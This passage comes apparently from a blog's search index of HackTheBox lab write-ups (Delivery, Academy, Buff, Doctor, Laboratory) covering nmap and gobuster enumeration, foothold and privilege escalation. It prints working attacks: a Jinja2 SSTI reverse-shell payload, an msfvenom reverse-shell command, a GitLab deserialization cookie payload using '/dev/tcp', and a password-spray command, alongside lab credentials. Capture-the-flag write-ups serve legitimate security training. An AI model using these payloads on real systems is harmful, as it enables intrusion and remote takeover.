SF:0Request\u0026#34;)%r(GetRequest,DF3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ranges:\\x SF:20bytes\\r\\nCache-Control:\\x20no-cache,\\x20max-age=31556926,\\x20public\\r SF:\\nContent-Length:\\x203108\\r\\nContent-Security-Policy:\\x20frame-ancestor SF:s\\x20\u0026#39;self\u0026#39;;\\x20script-src\\x20\u0026#39;self\u0026#39;\\x20cdn\\.rudderlabs\\.com\\r\\nContent SF:-Type:\\x20text/html;\\x20charset=utf-8\\r\\nLast-Modified:\\x20Sat,\\x2008\\x SF:20Jul\\x202023\\x2009:51:21\\x20GMT\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nX SF:-Request-Id:\\x206oxj36iapprdtktd5691zuzu4r\\r\\nX-Version-Id:\\x205\\.30\\.0 SF:\\.5\\.30\\.1\\.57fb31b889bf81d99d8af8176d4bbaaa\\.false\\r\\nDate:\\x20Sat,\\x2 SF:008\\x20Jul\\x202023\\x2010:17:53\\x20GMT\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x2 SF:0lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;viewport\\ SF:\u0026#34;\\x20content=\\\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user- SF:scalable=0\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;robots\\\u0026#34;\\x20content=\\\u0026#34;noindex,\\x20nofollow SF:\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;referrer\\\u0026#34;\\x20content=\\\u0026#34;no-referrer\\\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Matterm SF:ost\u0026lt;/title\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;mobile-web-app-capable\\\u0026#34;\\x20content=\\\u0026#34;yes\\\u0026#34;\u0026gt; SF:\u0026lt;meta\\x20name=\\\u0026#34;application-name\\\u0026#34;\\x20content=\\\u0026#34;Mattermost\\\u0026#34;\u0026gt;\u0026lt;meta\\x20n SF:ame=\\\u0026#34;format-detection\\\u0026#34;\\x20content=\\\u0026#34;telephone=no\\\u0026#34;\u0026gt;\u0026lt;link\\x20re\u0026#34;)%r(HT SF:TPOptions,5B,\u0026#34;HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nDate:\\x20 SF:Sat,\\x2008\\x20Jul\\x202023\\x2010:17:53\\x20GMT\\r\\nContent-Length:\\x200\\r\\ SF:n\\r\\n\u0026#34;)%r(RTSPRequest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent SF:-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n4 SF:00\\x20Bad\\x20Request\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\ SF:nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20 SF:Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConn SF:ection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie, SF:67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\ SF:x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 103.27 seconds Web Server Mattermost Foothold If we scan through web server, we will find links pointing to helpdesk.delivery.htb The hint on web server page We can only access MatterMost if we have @delivery.htb email We can also create tickets on helpdesk.delivery.htb When we create the ticket we get an @delivery.htb We can try using it for registration on MatterMost Let\u0026rsquo;s create a ticket Create an account on MatterMost using ticket information Check the ticket status and visit the confirmation link Access MatterMost And find the creds maildeliverer:Youve_G0t_Mail! We have our ssh connection Root Let\u0026rsquo;s enumerate linpeas showed mattermost\u0026rsquo;s location We have mysql credentials in the config file mmuser:Crack_The_MM_Admin_PW Connect to mysql We found users table with creds Let\u0026rsquo;s crack it using hashcat I remembered the PleaseSubscribe! that was mentioned in the comments We can use the hashcat\u0026rsquo;s rules to generate different variations of the same password And we have our password Rooted ","date":"July 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/delivery/images/delivery.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/delivery/","summary":"Delivery Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.222 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 11:18 BST Nmap scan report for 10.10.10.222 (10.10.10.222) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c40fa859b01acac0ebc0c19518aee27 (RSA) | 256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA) |_ 256 b79df7489da2f27630fd42d3353a808c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.","tags":["HTB","hashcat","hashcat-rules","vhosts"],"title":"[HTB] Machine: Delivery"},{"categories":null,"contents":"Academy Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.215 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 17:02 BST Nmap scan report for 10.10.10.215 (10.10.10.215) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c090a3d835256ffa3306cf8013a0a553 (RSA) | 256 2ad54bd046f0edc93c8df65dabae7796 (ECDSA) |_ 256 e16414c3cc51b23ba628a7b1ae5f4535 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://academy.htb/ 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\u0026#34; |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.80%I=7%D=11/9%Time=5FA927A7%P=x86_64-pc-linux-gnu%r(N SF:ULL,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(GenericLines,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\u0026#34;)%r(GetRequest,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(HTTPOp ...[snip]... SF:x05HY000\u0026#34;)%r(giop,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds Web server gobuster └─$ gobuster dir -u http://academy.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://academy.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/05 17:37:00 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 276] /images (Status: 301) [Size: 311] [--\u0026gt; http://academy.htb/images/] /index.php (Status: 200) [Size: 2117] /login.php (Status: 200) [Size: 2627] /register.php (Status: 200) [Size: 3003] /home.php (Status: 302) [Size: 55034] [--\u0026gt; login.php] /admin.php (Status: 200) [Size: 2633] /config.php (Status: 200) [Size: 0] Foothold I started with registering to the Web Server roleid is the most interesting parameter Let\u0026rsquo;s change roleid to 1 We can access admin.php Let\u0026rsquo;s check dev-staging-01.academy.htb We have laravel framework running And found an APP_Key There is a CVE-2018-15133 We can exploit it There is a nice post explaining the CVE Also check this post explaining the attack I spawn my own reverse shell so I can upgrade it User 1 Enumerate for privesc We got db password If we check for password reuse, we successfully login as cry0l1t3 Password spray: crackmapexec ssh 10.10.10.215 -u user.list -p 'mySup3rP4s5w0rd!!' cry0l1t3:mySup3rP4s5w0rd!! User 2 Groups According to [docs], Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole Let\u0026rsquo;s read logs There is a tool aureport, which can be used with --tty to show logs which include passwords in plain text based on following post Use the creds and pwn another user mrb3n:mrb3n_Ac@d3my! Root Check sudo rights Follow the [instructions] and get root ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/academy/images/academy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/academy/","summary":"Academy Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.215 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 17:02 BST Nmap scan report for 10.10.10.215 (10.10.10.215) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c090a3d835256ffa3306cf8013a0a553 (RSA) | 256 2ad54bd046f0edc93c8df65dabae7796 (ECDSA) |_ 256 e16414c3cc51b23ba628a7b1ae5f4535 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","deserialization","laravel","aureport","vhosts","adm"],"title":"[HTB] Machine: Academy"},{"categories":null,"contents":"Buff Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.198 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 16:06 BST Nmap scan report for 10.10.10.198 (10.10.10.198) Host is up (0.11s latency). PORT STATE SERVICE VERSION 7680/tcp open pando-pub? 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) |_http-title: mrb3n\u0026#39;s Bro Hut |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.73 seconds └─$ gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.198:8080 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/06 16:38:09 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/img/] /index.php (Status: 200) [Size: 4969] /home.php (Status: 200) [Size: 143] /contact.php (Status: 200) [Size: 4169] /about.php (Status: 200) [Size: 5337] /profile (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.198:8080/profile/] /register.php (Status: 200) [Size: 137] /feedback.php (Status: 200) [Size: 4252] /Home.php (Status: 200) [Size: 143] /upload (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.198:8080/upload/] /upload.php (Status: 200) [Size: 107] /Contact.php (Status: 200) [Size: 4169] /About.php (Status: 200) [Size: 5337] /edit.php (Status: 200) [Size: 4282] /license (Status: 200) [Size: 18025] /Index.php (Status: 200) [Size: 4969] /up.php (Status: 200) [Size: 209] /packages.php (Status: 200) [Size: 7791] /examples (Status: 503) [Size: 1058] /include (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.198:8080/include/] /licenses (Status: 403) [Size: 1203] /facilities.php (Status: 200) [Size: 5961] /Register.php (Status: 200) [Size: 137] /Profile (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.198:8080/Profile/] /LICENSE (Status: 200) [Size: 18025] /Feedback.php (Status: 200) [Size: 4252] /att (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/att/] /att.php (Status: 200) [Size: 816] /%20 (Status: 403) [Size: 1044] /IMG (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/IMG/] /INDEX.php (Status: 200) [Size: 4969] /License (Status: 200) [Size: 18025] /ex (Status: 301) [Size: 340] [--\u0026gt; http://10.10.10.198:8080/ex/] /*checkout*.php (Status: 403) [Size: 1044] /*checkout* (Status: 403) [Size: 1044] /*checkout*.txt (Status: 403) [Size: 1044] /Img (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/Img/] /boot (Status: 301) [Size: 342] [--\u0026gt; http://10.10.10.198:8080/boot/] /Upload (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.198:8080/Upload/] /Upload.php (Status: 200) [Size: 107] /phpmyadmin (Status: 403) [Size: 1203] /HOME.php (Status: 200) [Size: 143] Web server Foothold While visiting pages found by gobuster, I found that contact.php reveals the framework and its version Checking searchsploit gives us RCE Let\u0026rsquo;s run it But I wasn\u0026rsquo;t able to change the directories, since it\u0026rsquo;s a webshell and doesn\u0026rsquo;t save states So I wanted to upgrade the shell by uploading nc and geting reverse shell Root When I downloaded the winpeas for enumeration I noticed that in the Downloads directory there is a CloudMe_1112.exe file So I googled about it and checked the ports along with the list of running processes There is indeed CloudMe process running It seemed like it was running periodically since the port 8888 was opening and closing every 1 minute. Searchsploit returns a list of vulnerabilities And we have a match, since our exe file had a version 1.11.2 Let\u0026rsquo;s build a tunnel to expose the port We can use chisel Let\u0026rsquo;s check the exploit Generate payload and modify the PoC msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=7777 -b '\\x00\\x0A\\x0D' -f python -v payload Launch the listener and run the exploit ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/buff/images/buff.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/buff/","summary":"Buff Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.198 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 16:06 BST Nmap scan report for 10.10.10.198 (10.10.10.198) Host is up (0.11s latency). PORT STATE SERVICE VERSION 7680/tcp open pando-pub? 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) |_http-title: mrb3n\u0026#39;s Bro Hut |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","chisel","msfvenom","webshell"],"title":"[HTB] Machine: Buff"},{"categories":null,"contents":"Doctor Enumeration Nmap └─$ nmap -Pn -sC -sV 10.10.10.209 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 19:08 BST Nmap scan report for 10.10.10.209 (10.10.10.209) Host is up (0.11s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 594d4ec2d8cfda9da8c8d0fd99a84617 (RSA) | 256 7ff3dcfb2dafcbff9934ace0f8001e47 (ECDSA) |_ 256 530e966b9ce9c1a170516c2dce7b43e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after: 2023-09-06T15:57:27 |_http-server-header: Splunkd | http-robots.txt: 1 disallowed entry |_/ |_http-title: splunkd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.13 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.10.209 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.209 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/06 19:11:54 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.209/images/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.209/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.209/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.209/fonts/] /.php (Status: 403) [Size: 277] /server-status (Status: 403) [Size: 277] We have Splunk on port 8089 Foothold We have an email info@doctors.htb If we add doctors.htb to /etc/hosts file and visit it, we are redirected to /login?next=%2F Which is served under Werkzeug/1.0.1 Python/3.8.2 We can create an account and check what\u0026rsquo;s inside We can create posts If we check the source, we have /archive I tested for sqli but found nothing We might have SSTI, so let\u0026rsquo;s test it I started with basic payloads from the post There was nothing on the post page, but if we visit /archive page we see the results Let\u0026rsquo;s get reverse shell I used payload from PayloadAllTheThings {% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026quot;warning\u0026quot; in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\u0026quot;python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\u0026quot;10.10.16.12\\\u0026quot;,6666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\u0026quot;/bin/bash\\\u0026quot;, \\\u0026quot;-i\\\u0026quot;]);'\u0026quot;).read().zfill(417)}}{%endif%}{% endfor %} Launch a listener, create a new post and visit the /archive User Let\u0026rsquo;s run linpeas We find an interesting entry in logs POST /reset_password?email=Guitar123\u0026quot; 500 453 \u0026quot;http://doctor.htb/reset_password It happens to be shaun\u0026rsquo;s password Root linpeas found nothing Then I started enumerating splunk searchsploit has nothing Found an interesting repo SplunkWhisperer2s Let\u0026rsquo;s test it Well, it works Let\u0026rsquo;s get our root ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/doctor/images/doctor.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/doctor/","summary":"Doctor Enumeration Nmap └─$ nmap -Pn -sC -sV 10.10.10.209 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 19:08 BST Nmap scan report for 10.10.10.209 (10.10.10.209) Host is up (0.11s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 594d4ec2d8cfda9da8c8d0fd99a84617 (RSA) | 256 7ff3dcfb2dafcbff9934ace0f8001e47 (ECDSA) |_ 256 530e966b9ce9c1a170516c2dce7b43e8 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","splunk","vhosts","flask","payloadsallthethings","ssti","command-injection","injection","adm","linpeas","splunk-whisperer2"],"title":"[HTB] Machine: Doctor"},{"categories":null,"contents":"Laboratory Enumeration Nmap └─$ nmap -Pn -sC -sV 10.10.10.216 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 18:25 BST Nmap scan report for 10.10.10.216 (10.10.10.216) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25ba648f799d5d95972c1bb25e9b550d (RSA) |_ 256 7720ffe946c068921a0b2129d153aa87 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Not valid before: 2020-07-05T10:39:28 |_Not valid after: 2024-03-03T10:39:28 |_http-title: The Laboratory |_http-server-header: Apache/2.4.41 (Ubuntu) |_ssl-date: TLS randomness does not represent time Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.24 seconds gobuster └─$ gobuster dir -u https://laboratory.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://laboratory.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/06 18:37:13 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 319] [--\u0026gt; https://laboratory.htb/images/] /assets (Status: 301) [Size: 319] [--\u0026gt; https://laboratory.htb/assets/] /CREDITS.txt (Status: 200) [Size: 442] wfuzz ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'https://laboratory.htb' -H 'Host: FUZZ.laboratory.htb' -fs 7254 wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://laboratory.htb -H \u0026quot;Host: FUZZ.laboratory.htb\u0026quot; --hh 7254 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#39;https://laboratory.htb\u0026#39; -H \u0026#39;Host: FUZZ.laboratory.htb\u0026#39; -fc 200 -mc all /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : https://laboratory.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.laboratory.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all :: Filter : Response status: 200 ________________________________________________ [Status: 502, Size: 2940, Words: 460, Lines: 94, Duration: 244ms] * FUZZ: git Foothold git.laboratory.htb Let\u0026rsquo;s register We have a possible user dexter If we check the searchsploit, we have a possible hit We have a version: 12.8.1 We have a possible CVE-2020-10977 POC The poc works According to this [post], it can also be turned into RCE We need to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml Using same poc let\u0026rsquo;s grab that file secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 We need to generate a cookie with our payload that we will send to the target Read the followitng post So we spawn our own gitlab instance sudo docker run gitlab/gitlab-ce:12.8.1-ce.0 Check the container and open its\u0026rsquo; shell └─$ sudo docker ps [sudo] password for kali: CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES f875151cb6b1 gitlab/gitlab-ce:12.8.1-ce.0 \u0026#34;/assets/wrapper\u0026#34; About a minute ago Up About a minute (health: starting) 22/tcp, 80/tcp, 443/tcp trusting_black Update \u0026lsquo;secret_key_base\u0026rsquo; root@f875151cb6b1:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml root@f875151cb6b1:/# gitlab-ctl restart ok: run: alertmanager: (pid 8278) 0s ok: run: gitaly: (pid 8291) 0s ok: run: gitlab-exporter: (pid 8306) 0s ok: run: gitlab-workhorse: (pid 8324) 1s ok: run: grafana: (pid 8334) 0s ok: run: logrotate: (pid 8346) 0s ok: run: nginx: (pid 8429) 1s ok: run: postgres-exporter: (pid 8435) 0s ok: run: postgresql: (pid 8445) 1s ok: run: prometheus: (pid 8454) 0s ok: run: redis: (pid 8465) 1s ok: run: redis-exporter: (pid 8470) 0s ok: run: sidekiq: (pid 8478) 0s ok: run: sshd: (pid 8484) 0s ok: run: unicorn: (pid 8491) 0s Check the key root@f875151cb6b1:/# gitlab-rails console -------------------------------------------------------------------------------- GitLab: 12.8.1 (d18b43a5f5a) FOSS GitLab Shell: 11.0.0 PostgreSQL: 10.12 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.2) irb(main):001:0\u0026gt; Rails.application.env_config[\u0026#34;action_dispatch.secret_key_base\u0026#34;] =\u0026gt; \u0026#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8e\\nbb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3\u0026#34; irb(main):002:0\u0026gt; Let\u0026rsquo;s generate a payload based on the following report request = ActionDispatch::Request.new(Rails.application.env_config) request.env[\u0026#34;action_dispatch.cookies_serializer\u0026#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(\u0026#34;\u0026lt;%= `bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.2/6666 0\u0026gt;\u0026amp;1\u0026#39;` %\u0026gt;\u0026#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \u0026#34;@result\u0026#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] irb(main):001:0\u0026gt; Rails.application.env_config[\u0026#34;action_dispatch.secret_key_base\u0026#34;] =\u0026gt; \u0026#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8e\\nbb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3\u0026#34; irb(main):002:0\u0026gt; request = ActionDispatch::Request.new(Rails.application.env_config) =\u0026gt; #\u0026lt;ActionDispatch::Request:0x00007f552d878348 @env={\u0026#34;action_dispatch.parameter_filter\u0026#34;=\u0026gt;[/token$/, ... irb(main):003:0\u0026gt; request.env[\u0026#34;action_dispatch.cookies_serializer\u0026#34;] = :marshal =\u0026gt; :marshal irb(main):004:0\u0026gt; cookies = request.cookie_jar =\u0026gt; #\u0026lt;ActionDispatch::Cookies::CookieJar:0x00007f5527d21da0 @set_cookies={}, @delete_cookies={}, ... irb(main):005:0\u0026gt; erb = ERB.new(\u0026#34;\u0026lt;%= `bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.2/6666 0\u0026gt;\u0026amp;1\u0026#39;` %\u0026gt;\u0026#34;) =\u0026gt; #\u0026lt;ERB:0x00007f5527d9ac78 @safe_level=nil, @src=\u0026#34;#coding:UTF-8\\n_erbout = +\u0026#39;\u0026#39;; _erbout.\u0026lt;\u0026lt;(( `bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.2/6666 0\u0026gt;\u0026amp;1\u0026#39;` ).to_s); _erbout\u0026#34;, @encoding=#\u0026lt;Encoding:UTF-8\u0026gt;, @frozen_string=nil, @filename=nil, @lineno=0\u0026gt; irb(main):020:0\u0026gt; depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \u0026#34;@result\u0026#34;, ActiveSupport::Deprecation.new) bash: connect: Connection refused bash: /dev/tcp/10.10.16.2/6666: Connection refused =\u0026gt; \u0026#34;\u0026#34; irb(main):021:0\u0026gt; cookies.signed[:cookie] = depr DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):21) bash: connect: Connection refused bash: /dev/tcp/10.10.16.2/6666: Connection refused bash: connect: Connection refused bash: /dev/tcp/10.10.16.2/6666: Connection refused =\u0026gt; \u0026#34;\u0026#34; irb(main):022:0\u0026gt; puts cookies[:cookie] 